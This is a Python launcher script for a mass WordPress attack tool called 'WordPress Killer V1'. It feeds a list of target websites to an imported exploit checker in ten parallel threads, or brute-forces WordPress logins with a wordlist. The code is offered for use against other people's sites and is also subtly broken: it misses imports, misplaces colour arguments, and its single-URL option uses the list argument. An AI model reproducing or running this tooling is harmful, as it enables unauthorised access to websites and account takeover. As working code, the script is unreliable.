#!/usr/bin/python3

################################################
# Created By Dinar Hamid                       #
# module created by Galeh Rizky And Dinar Hamid#
# kerja bangsat                                #
################################################
from termcolor import colored
import argparse
from concurrent.futures import ThreadPoolExecutor
from galer.exploit import check_cms
from galer.wpbrute import go_brute

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'}
month = time.strftime("%m")
years = time.strftime("%Y")

def banner():
	print("""_  _ ____ _  _ ___ ____ ____ ____ _ ___ 
|\/| |__|  \/   |  |___ |__/ |  | |  |  
|  | |  | _/\_  |  |___ |  \ |__| |  |  
                                        
GabutEX v1""")

def default_run(lis):
	try:
		with ThreadPoolExecutor(max_workers=10) as Executor:
			with open(lis, 'r') as target:
				for s in target:
					url = s.rstrip()
					Executor.submit(check_cms,url)
	except IOError as e:
		print(colored("Unknow error.",'red'))
		sys.exit()

def _brute(l,p):
		try:
			if 'default' in p:
				go_brute(l,'disini/wordlist.txt')
			else:
				go_brute(l,p)
		except:
			print(colored("Seems we got error while try brute force"),'red')

def main():
	try:
		parse = argparse.ArgumentParser(description='WordPress Killer V1')
		parse.add_argument("--list", help="List website target", required=True)
		parse.add_argument("--brute", help="WordPress Brute Force")
		parse.add_argument("--password", help="Costum Password with specific directory")
		parse.add_argument("--kill", help="Just scan all and try with lucky")
		parse.add_argument("--url", help="single target")
		peler = parse.parse_args()
		try:
			if peler.list:
				if peler.brute:
					if peler.password:
						_brute(peler.list,peler.password)
					else:
						_brute(peler.list,"default")
				elif peler.kill:
					default_run(peler.list)
			elif peler.url:
				if peler.brute:
					if peler.password:
						_brute(peler.list,peler.password)
					else:
						_brute(peler.list,"default")
				elif peler.kill:
					default_run(peler.list)				
		except IOError as e:
			print(colored("Error"+e),'red')
	except KeyboardInterrupt as e:
		print(colored("UNknow error.",'red'))
		sys.exit()		

if __name__ == '__main__':
	banner()
	main()
